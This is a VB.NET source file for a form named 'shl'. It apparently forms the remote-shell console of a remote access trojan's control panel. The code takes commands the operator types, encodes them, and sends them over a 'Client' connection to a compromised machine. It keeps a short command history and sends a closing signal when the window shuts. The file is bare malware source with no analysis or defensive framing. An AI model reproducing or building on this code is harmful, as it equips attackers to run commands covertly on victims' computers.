Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class shl
    Inherits Form
    ' Methods
    Public Sub New()
        AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.shl_FormClosing)
        AddHandler MyBase.Resize, New EventHandler(AddressOf Me.shl_Resize)
        AddHandler MyBase.Load, New EventHandler(AddressOf Me.shl_Load)
        Me.A = New String(5 - 1) {}
        Me.idx = 0
        Me.it = 0
        Me.InitializeComponent()
    End Sub
    Private A As String()
    Private idx As Integer
    Private it As Integer
    Public sk As Client

    Private Sub shl_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If sk.CN Then
            sk.Send("rsc")
        End If
    End Sub
    Private Sub shl_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Text = Conversions.ToString(ind.vno(sk.L))
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If Not sk.CN Then
            Me.Close()
        End If
    End Sub

    Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs) Handles T2.KeyDown
        Select Case e.KeyCode
            Case Keys.Enter
                Dim text As String = T2.Text
                T2.Text = ""
                e.SuppressKeyPress = True
                A(it) = text
                it += 1
                If (it > (A.Length - 1)) Then
                    it = 0
                End If
                sk.Send(("rs" & ind.Y & FN.ENB([text])))
                Exit Select
            Case Keys.Down
                idx = (idx + -1)
                If (idx < 0) Then
                    idx = 0
                End If
                T2.Text = A(idx)
                Exit Select
            Case Keys.Up
                idx += 1
                If (idx > (A.Length - 1)) Then
                    idx = (A.Length - 1)
                End If
                T2.Text = A(idx)
                Exit Select
        End Select
    End Sub

    Private Sub shl_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        T1.ScrollToCaret()
    End Sub
End Class